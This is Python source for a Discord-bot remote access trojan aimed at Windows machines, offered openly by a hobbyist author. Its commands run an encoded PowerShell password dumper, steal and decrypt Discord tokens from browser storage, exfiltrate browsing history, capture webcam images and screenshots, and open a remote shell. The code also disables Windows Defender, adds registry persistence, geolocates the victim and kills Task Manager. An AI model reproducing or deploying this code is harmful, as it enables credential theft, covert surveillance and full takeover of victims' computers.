# Developed by nspe (lol ive been working on this for 3 weeks cause i was bored)
# If your a friend of mine and you ran this just know that I told you not to :pensive:

# CHANGE LINE 65 TO YOUR OWN BOT TOKEN
# CHANGE NAME VARIABLE ON LINE 432 TO YOUR SERVER NAME

#---------------------------------------#
#               IMPORTS                 #
#---------------------------------------#

import discord
import discord
from discord.ext import commands
import os
import tkinter as tk
import mss
import cv2
import numpy as np
import webbrowser
import ctypes
import pyttsx3
import asyncio
import platform
import psutil
import socket
import getpass
import shutil
import subprocess
import aiohttp
import winshell
import argparse
import sys
import re
import base64
import json
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import win32crypt
import time
import inspect
import winreg
import sqlite3
from re import findall
from json import loads
from base64 import b64decode
import requests
from subprocess import Popen, PIPE
from urllib.request import Request, urlopen
from datetime import datetime
from threading import Thread
from time import sleep
import urllib.request
from sys import argv
from win32crypt import CryptUnprotectData
from pynput.keyboard import Key, Listener
import logging
import threading
import pygetwindow


#---------------------------------------#
#             TOKEN & VARS              #
#---------------------------------------#

TOKEN = ''
intents = discord.Intents.all()
bot = commands.Bot(command_prefix='!', intents=intents)
chatbox_window = None
chat_text_widget = None
print("monkey monkey ooga booga")

async def on_message(message):
    if message.content.startswith('!') and isinstance(message.channel, discord.TextChannel):
        session_id = message.channel.name
        bot_username = getpass.getuser()
        command_prefix = bot.command_prefix
        command_args = message.content.split(' ')
        command_name = command_args[0][len(command_prefix):].lower()
        if session_id.lower() == bot_username.lower():
            await bot.process_commands(message)
        else:
            await message.channel.send("This command cannot be executed in this session.")
    else:
        await bot.process_commands(message)

keylog_enabled = False # DO NOT CHANGE MANUALLY
selected_webcam = None
webcam_indices = {}

#---------------------------------------#
#               SETTINGS                #
#---------------------------------------#

# WORK IN PROGRESS <3

#---------------------------------------#
#               COMMANDS                #
#---------------------------------------#

@bot.command()
async def inputs(ctx):
    try:
        # Get list of input devices
        input_devices = pygetwindow.getAllTitles()
        if input_devices:
            await ctx.send("List of connected input devices:")
            for device in input_devices:
                await ctx.send(device)
        else:
            await ctx.send("No input devices found.")
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")

@bot.command()
async def webcams(ctx):
    global webcam_indices
    webcam_indices = {}
    webcam_names = []
    try:
        index = 0
        while True:
            cap = cv2.VideoCapture(index)
            if not cap.isOpened():
                break
            ret, _ = cap.read()
            if ret:
                webcam_name = f"Webcam {index}"
                webcam_names.append(webcam_name)
                webcam_indices[webcam_name] = index
            cap.release()
            index += 1
    except Exception as e:
        print(f"Error: {e}")
    if webcam_names:
        await ctx.send("List of connected webcams:")
        for name in webcam_names:
            await ctx.send(name)
    else:
        await ctx.send("No webcams found.")

@bot.command()
async def selectcam(ctx, *, webcam_name: str):
    global selected_webcam
    if webcam_name in webcam_indices:
        selected_webcam = webcam_indices[webcam_name]
        await ctx.send(f"Selected webcam {webcam_name}.")
    else:
        await ctx.send(f"Webcam {webcam_name} not found.")

@bot.command()
async def getcam(ctx):
    global selected_webcam
    if selected_webcam is not None:
        cap = cv2.VideoCapture(selected_webcam)
        ret, frame = cap.read()
        cap.release()
        if ret:
            cv2.imwrite("webcam_image.jpg", frame)
            await ctx.send("Picture captured!", file=discord.File("webcam_image.jpg"))
            return
    await ctx.send("No webcam selected or failed to capture picture.")

@bot.command()
async def passwords(ctx):
    temp = os.getenv('temp')
    print("Getting Temp")
    def shell(command):
        output = subprocess.run(command, stdout=subprocess.PIPE, shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        global status
        status = "ok"
        print(status)
        return output.stdout.decode('CP437').strip()
    passwords = shell("Powershell -NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -Encoded WwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACgAJwB7ACIAUwBjAHIAaQBwAHQAIgA6ACIASgBHAGwAdQBjADMAUgBoAGIAbQBOAGwASQBEADAAZwBXADAARgBqAGQARwBsADIAWQBYAFIAdgBjAGwAMAA2AE8AawBOAHkAWgBXAEYAMABaAFUAbAB1AGMAMwBSAGgAYgBtAE4AbABLAEYAdABUAGUAWABOADAAWgBXADAAdQBVAG0AVgBtAGIARwBWAGoAZABHAGwAdgBiAGkANQBCAGMAMwBOAGwAYgBXAEoAcwBlAFYAMAA2AE8AawB4AHYAWQBXAFEAbwBLAEUANQBsAGQAeQAxAFAAWQBtAHAAbABZADMAUQBnAFUAMwBsAHoAZABHAFYAdABMAGsANQBsAGQAQwA1AFgAWgBXAEoARABiAEcAbABsAGIAbgBRAHAATABrAFIAdgBkADIANQBzAGIAMgBGAGsAUgBHAEYAMABZAFMAZwBpAGEASABSADAAYwBIAE0ANgBMAHkAOQB5AFkAWABjAHUAWgAyAGwAMABhAEgAVgBpAGQAWABOAGwAYwBtAE4AdgBiAG4AUgBsAGIAbgBRAHUAWQAyADkAdABMADAAdwB4AFoAMgBoADAAVABUAFIAdQBMADAAUgA1AGIAbQBGAHQAYQBXAE4AVABkAEcAVgBoAGIARwBWAHkATAAyADEAaABhAFcANAB2AFIARQB4AE0ATAAxAEIAaABjADMATgAzAGIAMwBKAGsAVQAzAFIAbABZAFcAeABsAGMAaQA1AGsAYgBHAHcAaQBLAFMAawB1AFIAMgBWADAAVgBIAGwAdwBaAFMAZwBpAFUARwBGAHoAYwAzAGQAdgBjAG0AUgBUAGQARwBWAGgAYgBHAFYAeQBMAGwATgAwAFoAVwBGAHMAWgBYAEkAaQBLAFMAawBOAEMAaQBSAHcAWQBYAE4AegBkADIAOQB5AFoASABNAGcAUABTAEEAawBhAFcANQB6AGQARwBGAHUAWQAyAFUAdQBSADIAVgAwAFYASABsAHcAWgBTAGcAcABMAGsAZABsAGQARQAxAGwAZABHAGgAdgBaAEMAZwBpAFUAbgBWAHUASQBpAGsAdQBTAFcANQAyAGIAMgB0AGwASwBDAFIAcABiAG4ATgAwAFkAVwA1AGoAWgBTAHcAawBiAG4AVgBzAGIAQwBrAE4AQwBsAGQAeQBhAFgAUgBsAEwAVQBoAHYAYwAzAFEAZwBKAEgAQgBoAGMAMwBOADMAYgAzAEoAawBjAHcAMABLACIAfQAnACAAfAAgAEMAbwBuAHYAZQByAHQARgByAG8AbQAtAEoAcwBvAG4AKQAuAFMAYwByAGkAcAB0ACkAKQAgAHwAIABpAGUAeAA=")
    print("Setting Password Var")
    f4 = open(temp + r"\passwords.txt", 'w')
    f4.write(str(passwords))
    f4.close()
    print("Doing F4 Stuff")
    file = discord.File(temp + r"\passwords.txt", filename="passwords.txt")
    await ctx.send("[*] Command successfully executed", file=file)
    os.remove(temp + r"\passwords.txt")

@bot.command()
async def token(ctx):
    LOCAL = os.getenv("LOCALAPPDATA")
    ROAMING = os.getenv("APPDATA")
    PATHS = [
        ROAMING + "\\Discord",
        ROAMING + "\\discordcanary",
        ROAMING + "\\discordptb",
        LOCAL + "\\Google\\Chrome\\User Data\\Default",
        ROAMING + "\\Opera Software\\Opera Stable",
        LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
        LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
    ]
    regex1 = "[\\w-]{24}\.[\\w-]{6}\\.[\\w-]{27}"
    regex2 = r"mfa\\.[\\w-]{84}"
    encrypted_regex = "dQw4w9WgXcQ:[^.*\\['(.*)'\\].*$]{120}"
    
    def getheaders(token=None, content_type="application/json"):
        headers = {
            "Content-Type": content_type,
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
        }
        if token:
            headers.update({"Authorization": token})
        return headers
    
    def getuserdata(token):
        try:
            return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
        except:
            pass
    
    def decrypt_payload(cipher, payload):
        return cipher.decrypt(payload)
    
    def generate_cipher(aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)
    
    def decrypt_password(buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = generate_cipher(master_key, iv)
            decrypted_pass = decrypt_payload(cipher, payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return "Failed to decrypt password"
    
    def get_master_key(path):
        with open(path, "r", encoding="utf-8") as f:
            local_state = f.read()
        local_state = json.loads(local_state)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key
    
    def gettokens(path):
        path1 = path
        path += "\\Local Storage\\leveldb"
        tokens = []
        try:
            if not "discord" in path.lower():
                for file_name in os.listdir(path):
                    if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for token in findall(regex1, line):
                            try:
                                r = requests.get("https://discord.com/api/v9/users/@me", headers=getheaders(token))
                                if r.status_code == 200:
                                    if token in tokens:
                                        continue
                            except Exception:
                                continue
                            tokens.append(token)
                        for token in findall(regex2, line):
                            try:
                                r = requests.get("https://discord.com/api/v9/users/@me", headers=getheaders(token))
                                if r.status_code == 200:
                                    if token in tokens:
                                        continue
                            except Exception:
                                continue
                            tokens.append(token)
            else:
                for file_name in os.listdir(path):
                    if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for y in findall(encrypted_regex, line):
                            token = decrypt_password(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), get_master_key(path1 + '\\Local State'))
                            try:
                                r = requests.get("https://discord.com/api/v9/users/@me", headers=getheaders(token))
                                if r.status_code == 200:
                                    if token in tokens:
                                        continue
                                    tokens.append(token)
                            except:
                                continue
            return tokens
        except Exception as e:
            return []
    
    alltokens = []
    for i in PATHS:
        e = gettokens(i)
        for c in e:
            alltokens.append(c)
    await ctx.send("\n".join(alltokens))

@bot.command()
async def history(ctx):
    try:
        temp = os.getenv('TEMP')
        username = os.getenv('USERNAME')
        shutil.rmtree(os.path.join(temp, "history12"), ignore_errors=True)
        os.mkdir(os.path.join(temp, "history12"))
        
        path_org = r"C:\Users\{}\AppData\Local\Google\Chrome\User Data\Default\History".format(username)
        path_new = os.path.join(temp, "history12")
        copy_command = 'copy "{}" "{}"'.format(path_org, path_new)
        os.system(copy_command)
        
        con = sqlite3.connect(os.path.join(path_new, "History"))
        cursor = con.cursor()
        cursor.execute("SELECT url FROM urls")
        urls = cursor.fetchall()
        for url in urls:
            done = "".join(url)
            with open(os.path.join(temp, "history12", "history.txt"), 'a') as f:
                f.write(str(done))
                f.write("\n")
        con.close()
        
        file = discord.File(os.path.join(temp, "history12", "history.txt"), filename="history.txt")
        await ctx.send("[*] Command successfully executed", file=file)
        
        def deleteme():
            path = "rmdir /s /q " + os.path.join(temp, "history12")
            os.system(path)
        deleteme()
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")

@bot.command()
async def startup(ctx, action):
    try:
        exe_path = sys.executable
        
        if action.lower() == "enable":
            set_startup_registry(os.path.basename(exe_path), exe_path)
            await ctx.send(f"Bot is now set to run at startup.")
        elif action.lower() == "disable":
            disable_startup_registry(os.path.basename(exe_path))
            await ctx.send(f"Bot is no longer set to run at startup.")
        else:
            await ctx.send("Invalid action. Use 'enable' or 'disable'.")
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")

@bot.command()
async def filesearch(ctx, filename):
    try:
        found_files = []
        for root, dirs, files in os.walk("C:\\"):
            for file in files:
                if file.lower() == filename.lower():
                    found_files.append(os.path.join(root, file))
        
        if found_files:
            await ctx.send(f"Found {len(found_files)} files named '{filename}':")
            for file_path in found_files:
                await ctx.send(file_path)
        else:
            await ctx.send(f"No files named '{filename}' found.")
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")

popular_vpns = [
    "NordVPN", "ExpressVPN", "Surfshark", "CyberGhost", "Private Internet Access",
    "VyprVPN", "IPVanish", "TunnelBear", "Hotspot Shield", "Windscribe",
    "ProtonVPN", "Hide.me", "PureVPN", "FastestVPN", "Namecheap VPN", "Cloudflare WARP"
]

chrome_extension_vpns = [
    "1.1.1.1", "ExpressVPN Chrome Extension", "NordVPN Chrome Extension", "Surfshark VPN for Chrome"
]

@bot.command()
async def vpn(ctx):
    try:
        vpn_found = set()
        for root, dirs, files in os.walk("C:\\"):
            for file in files:
                for vpn_name in popular_vpns:
                    if vpn_name.lower() in file.lower() and file.endswith(".exe"):
                        if vpn_name not in vpn_found:
                            vpn_found.add(vpn_name)
                            await ctx.send(f"Found .exe with '{vpn_name}' in name: {os.path.join(root, file)}")
                            is_running = is_process_running(vpn_name)
                            await ctx.send(f"{vpn_name} is {'running' if is_running else 'not running'}")
        chrome_extensions_path = os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "Extensions")
        if os.path.exists(chrome_extensions_path):
            for extension in os.listdir(chrome_extensions_path):
                for vpn_name in popular_vpns:
                    if vpn_name.lower() in extension.lower():
                        if vpn_name not in vpn_found:
                            vpn_found.add(vpn_name)
                            await ctx.send(f"Found Chrome extension with '{vpn_name}' in name: {os.path.join(chrome_extensions_path, extension)}")
        for vpn_name in chrome_extension_vpns:
            if vpn_name.lower() in extension.lower():
                if vpn_name not in vpn_found:
                    vpn_found.add(vpn_name)
                    await ctx.send(f"Found Chrome extension VPN with '{vpn_name}' in name: {extension}")
        
        if not vpn_found:
            await ctx.send("No VPN-related software found.")
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")

def is_process_running(process_name):
    try:
        output = subprocess.check_output(['tasklist', '/FI', f'IMAGENAME eq {process_name}.exe'])
        return process_name.lower() in str(output).lower()
    except subprocess.CalledProcessError:
        return False

@bot.command()
async def disablewindef(ctx):
    try:
        command = "Set-MpPreference -DisableRealtimeMonitoring $true"
        subprocess.run(["powershell", "-ExecutionPolicy", "Bypass", "-Command", command], shell=True, check=True)
        await ctx.send("Windows Defender has been disabled remotely.")
    except subprocess.CalledProcessError as e:
        await ctx.send(f"Error: Failed to disable Windows Defender. {e}")
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command()
async def admincheck(ctx):
    if ctypes.windll.shell32.IsUserAnAdmin():
        await ctx.send("The bot has administrator permissions on this computer.")
    else:
        await ctx.send("The bot does not have administrator permissions on this computer.")

@bot.event
async def on_ready():
    guild = discord.utils.get(bot.guilds, name='')
    if guild is None:
        print("Error: Bot couldn't find the specified guild.")
        return
    username = getpass.getuser()
    session_channel = await find_or_create_session_channel(guild, username)
    ip_address = await get_ip_address()
    await session_channel.send(f"New Session Created | IP: {ip_address} | User: {username}")

@bot.command()
async def procs(ctx):
    process_counts = get_process_names_with_counts()
    process_info = [f"{name} ({count})" if count > 1 else name for name, count in process_counts.items()]
    process_info_str = "\n".join(process_info)
    await ctx.send("Processes:\n" + process_info_str)

@bot.command()
async def screenshot(ctx):
    await take_screenshot()
    await send_screenshot(ctx)

@bot.command()
async def cd(ctx, directory: str):
    try:
        os.chdir(directory)
        await ctx.send(f"Changed directory to {os.getcwd()}")
    except Exception as e:
        await ctx.send(f"Failed to change directory: {e}")

@bot.command()
async def dir(ctx):
    try:
        files = os.listdir()
        if files:
            await ctx.send("Files and directories in current directory:")
            for file in files:
                await ctx.send(file)
        else:
            await ctx.send("The current directory is empty.")
    except Exception as e:
        await ctx.send(f"Failed to list directory contents: {e}")

@bot.command()
async def showdirs(ctx):
    try:
        directories = [d for d in os.listdir() if os.path.isdir(d)]
        if directories:
            await ctx.send("Available directories:")
            for directory in directories:
                await ctx.send(directory)
        else:
            await ctx.send("There are no directories in the current directory.")
    except Exception as e:
        await ctx.send(f"Failed to list directories: {e}")

@bot.command()
async def download(ctx, filename: str):
    try:
        if os.path.exists(filename):
            await ctx.send(file=discord.File(filename))
        else:
            await ctx.send(f"The file '{filename}' does not exist.")
    except Exception as e:
        await ctx.send(f"Failed to download file: {e}")

@bot.command()
async def upload(ctx):
    try:
        if len(ctx.message.attachments) == 0:
            await ctx.send("Please attach a file to upload.")
            return
        attachment = ctx.message.attachments[0]
        filename = attachment.filename
        await attachment.save(filename)
        await ctx.send(f"File '{filename}' has been uploaded.")
    except Exception as e:
        await ctx.send(f"Failed to upload file: {e}")

@bot.command()
async def website(ctx, url: str):
    await open_website(url)

@bot.command()
async def message(ctx, *, text: str):
    show_popup(text)

@bot.command()
async def audio(ctx, *, text: str):
    text_to_speech(text)

@bot.command()
async def info(ctx):
    system_info = await get_system_info()
    ip_address = await get_ip_address()
    connected_wifi = await get_connected_wifi()
    email = await get_email()
    hwid = await get_hwid()
    device_id = await get_device_id()
    is_virtual_machine = await check_virtual_machine()
    is_vpn_used = await detect_vpn_usage()

    info_message = f"```{system_info}\nIP Address: {ip_address}\nConnected WiFi: {connected_wifi}\nRegistered Owner (Email): {email}\nHWID: {hwid}\nDevice ID: {device_id}\nVirtual Machine: {is_virtual_machine}\nVPN in use: {is_vpn_used}```"

    await ctx.send(info_message)

@bot.command()
async def prockill(ctx, process_name: str):
    processes_to_kill = []
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'] == process_name:
            processes_to_kill.append(proc)
    if not processes_to_kill:
        await ctx.send(f"No process with the name '{process_name}' is running.")
    else:
        for proc in processes_to_kill:
            proc.kill()
        await ctx.send(f"All instances of '{process_name}' have been terminated.")

@bot.command()
async def procsearch(ctx, process_name: str):
    process_found = False
    for proc in psutil.process_iter(['name']):
        if proc.info['name'] == process_name:
            process_found = True
            break
    if process_found:
        await ctx.send(f"Process '{process_name}' is running.")
    else:
        await ctx.send(f"No process with the name '{process_name}' is running.")

@bot.command()
async def wallpaper(ctx):
    if len(ctx.message.attachments) == 0:
        await ctx.send("Please attach an image to set as wallpaper.")
        return
    attachment = ctx.message.attachments[0]
    filename, extension = os.path.splitext(attachment.filename)
    valid_extensions = ['.jpg', '.jpeg', '.png', '.bmp']
    if extension.lower() not in valid_extensions:
        await ctx.send("Unsupported file type. Please attach an image with a valid extension.")
        return
    pictures_dir = os.path.join(os.path.expanduser('~'), 'Pictures')
    image_path = os.path.join(pictures_dir, attachment.filename)
    await attachment.save(image_path)
    if set_wallpaper(image_path):
        await ctx.send("Wallpaper has been updated.")
    else:
        await ctx.send("Can't change wallpaper. Most likely unsupported file type.")

@bot.command()
async def geolocate(ctx):
    location_info, geolocation_url = await get_geolocation()
    await ctx.send(location_info)
    if geolocation_url:
        await ctx.send(f"Geolocation URL: {geolocation_url}")

@bot.command()
async def shell(ctx, *, command: str):
    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
        await ctx.send(f"```\n{result}\n```")
    except subprocess.CalledProcessError as e:
        await ctx.send(f"Command '{command}' returned non-zero exit status {e.returncode}:\n```\n{e.output}\n```")
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")

@bot.command()
async def startproc(ctx, process_name: str):
    try:
        subprocess.Popen(process_name)
        await ctx.send(f"Process '{process_name}' has been started.")
    except Exception as e:
        await ctx.send(f"Error occurred while starting process '{process_name}': {e}")

@bot.command()
async def cmd(ctx, *, command: str):
    try:
        result = subprocess.check_output(['cmd', '/c', command], stderr=subprocess.STDOUT, universal_newlines=True)
        
        if len(result) > 2000:
            with open('cmd_output.txt', 'w', encoding='utf-8') as f:
                f.write(result)
            await ctx.send(file=discord.File('cmd_output.txt'))
        else:
            await ctx.send(f"```\n{result}\n```")
    except subprocess.CalledProcessError as e:
        await ctx.send(f"Command '{command}' returned non-zero exit status {e.returncode}:\n```\n{e.output}\n```")
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")


#---------------------------------------#
#              async defs               #
#---------------------------------------#

async def check_admin_perms(ctx):
    if ctx.author.guild_permissions.administrator:
        return True
    else:
        await ctx.send("You do not have administrator permissions. Cannot proceed with UAC bypass.")
        return False

async def uac_bypass_method(ctx, method_id, method_command, success_message):
    os.system(method_command)
    await ctx.send(success_message)

async def take_screenshot():
    with mss.mss() as sct:
        screenshot = sct.shot(output='screenshot.png')

async def send_screenshot(ctx):
    await ctx.send(file=discord.File("screenshot.png"))

async def take_camera_screenshot():
    os.system("start microsoft.windows.camera:")
    await asyncio.sleep(5)
    await take_screenshot()
    os.system("taskkill /im WindowsCamera.exe /f")

async def send_video(ctx, filename):
    await ctx.send(file=discord.File(filename))

async def open_website(url):
    webbrowser.open(url)

def show_popup(message):
    ctypes.windll.user32.MessageBoxW(0, message, "Message", 0)

def text_to_speech(text):
    engine = pyttsx3.init()
    engine.say(text)
    engine.runAndWait()

async def get_system_info():
    try:
        registered_owner = await get_registered_owner()
    except Exception as e:
        print(f"Error occurred while retrieving system information: {e}")
        registered_owner = "Unknown"

    system_info = f"System: {platform.system()} {platform.release()}"
    cpu_info = f"CPU: {platform.processor()}"
    memory_info = psutil.virtual_memory()
    memory_total_gb = round(memory_info.total / (1024 ** 3), 2)
    memory_used_gb = round(memory_info.used / (1024 ** 3), 2)
    memory_percent = memory_info.percent
    memory_info_str = f"Memory: {memory_used_gb}GB used / {memory_total_gb}GB total ({memory_percent}%)"
    disk_info = psutil.disk_usage('/')
    disk_total_gb = round(disk_info.total / (1024 ** 3), 2)
    disk_used_gb = round(disk_info.used / (1024 ** 3), 2)
    disk_percent = disk_info.percent
    disk_info_str = f"Disk: {disk_used_gb}GB used / {disk_total_gb}GB total ({disk_percent}%)"
    return f"{system_info}\nRegistered Owner: {registered_owner}\n{cpu_info}\n{memory_info_str}\n{disk_info_str}"

async def get_registered_owner():
    try:
        result = subprocess.check_output('wmic computersystem get RegisteredOwner', shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
        return result.strip()
    except subprocess.CalledProcessError as e:
        print(f"Error occurred while retrieving Registered Owner: {e}")
        return "Unknown"

async def get_ip_address():
    try:
        ip_address = socket.gethostbyname(socket.gethostname())
        return ip_address
    except Exception as e:
        return str(e)

async def get_connected_wifi():
    try:
        command_output = subprocess.check_output(['netsh', 'wlan', 'show', 'interfaces']).decode()
        lines = command_output.split('\n')
        for line in lines:
            if "SSID" in line:
                ssid = line.split(":")[1].strip()
                return ssid
        return "Not connected to WiFi"
    except Exception as e:
        return str(e)

async def get_email():
    try:
        command_output = subprocess.check_output('wmic computersystem get RegisteredOwner').decode().split('\n')[1].strip()
        return command_output
    except Exception as e:
        return str(e)

async def get_hwid():
    try:
        hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
        return hwid
    except Exception as e:
        return str(e)

async def get_device_id():
    try:
        device_id = subprocess.check_output('wmic path win32_computersystemproduct get IdentifyingNumber').decode().split('\n')[1].strip()
        return device_id
    except Exception as e:
        return str(e)

async def check_virtual_machine():
    try:
        command_output = subprocess.check_output('wmic computersystem get Manufacturer').decode().split('\n')[1].strip()
        return "Yes" if "Microsoft Corporation" in command_output else "No"
    except Exception as e:
        return str(e)

async def detect_vpn_usage():
    try:
        ip_address = await get_public_ip()
        async with aiohttp.ClientSession() as session:
            async with session.get('https://api64.ipify.org') as response:
                public_ip = await response.text()
        return "Yes" if ip_address != public_ip else "No"
    except Exception as e:
        return str(e)

async def find_or_create_session_channel(guild, username):
    existing_channels = [c.name for c in guild.channels if isinstance(c, discord.TextChannel)]
    
    if username in existing_channels:
        session_channel = discord.utils.get(guild.channels, name=username)
        return session_channel
    
    try:
        session_channel = await guild.create_text_channel(username)
        return session_channel
    except discord.Forbidden:
        print("Error: Bot doesn't have permission to create channels in the guild.")
    except discord.HTTPException:
        print("Error: Failed to create the text channel.")

def find_next_session_name(existing_channels):
    username = getpass.getuser()
    session_num = 1
    while True:
        session_name = f"{username}"
        if session_name not in existing_channels:
            return session_name
        session_num += 1

def get_process_names_with_counts():
    process_counts = {}
    for proc in psutil.process_iter(['name']):
        process_name = proc.info['name']
        if process_name in process_counts:
            process_counts[process_name] += 1
        else:
            process_counts[process_name] = 1
    return process_counts

async def monitor_taskmgr(ctx):
    try:
        while True:
            for proc in psutil.process_iter(['pid', 'name']):
                if proc.info['name'] == 'Taskmgr.exe': 
                    proc.kill()
                    await ctx.send("User attempted to open Task Manager!")
            await asyncio.sleep(1)
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")

async def get_public_ip():
    async with aiohttp.ClientSession() as session:
        async with session.get('https://api64.ipify.org') as response:
            ip_address = await response.text()
    return ip_address

async def get_public_ip_from_vpn_check_api():
    async with aiohttp.ClientSession() as session:
        async with session.get('https://api64.ipify.org?format=json') as response:
            data = await response.json()
    return data.get('ip', '')

def set_wallpaper(image_path):
    print(f"Setting wallpaper with image: {image_path}")
    try:
        ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 3)
        return True
    except Exception as e:
        print(f"Error setting wallpaper: {e}")
        return False
    
async def get_geolocation():
    try:
        ip_address = await get_public_ip()
        vpn_check_ip = await get_public_ip_from_vpn_check_api()
        if vpn_check_ip != ip_address:
            return "VPN detected", None
        async with aiohttp.ClientSession() as session:
            async with session.get(f'http://ip-api.com/json/{ip_address}') as response:
                data = await response.json()
        if data['status'] == 'success':
            city = data['city']
            country = data['country']
            lat = data['lat']
            lon = data['lon']
            geolocation_url = f"https://www.geolocation.com/en_us?ip={ip_address}#ipresult"
            return f"City: {city}, Country: {country}, Latitude: {lat}, Longitude: {lon}", geolocation_url
        else:
            return "Failed to retrieve geolocation information", None
    except Exception as e:
        return f"Error: {e}", None

def isAdmin():
    try:
        is_admin = (os.getuid() == 0)
    except AttributeError:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    return is_admin

def find_exe(exe_name):
    for root, dirs, files in os.walk("C:\\"):
        for file in files:
            if file.lower() == f"{exe_name}.exe":
                return os.path.join(root, file)
    return None

def set_startup_registry(exe_name, exe_path):
    startup_reg_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
    with winreg.OpenKey(winreg.HKEY_CURRENT_USER, startup_reg_key, 0, winreg.KEY_WRITE) as key:
        winreg.SetValueEx(key, exe_name, 0, winreg.REG_SZ, exe_path)

def disable_startup_registry(exe_name):
    startup_reg_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
    with winreg.OpenKey(winreg.HKEY_CURRENT_USER, startup_reg_key, 0, winreg.KEY_WRITE) as key:
        winreg.DeleteValue(key, exe_name)

bot.run(TOKEN)
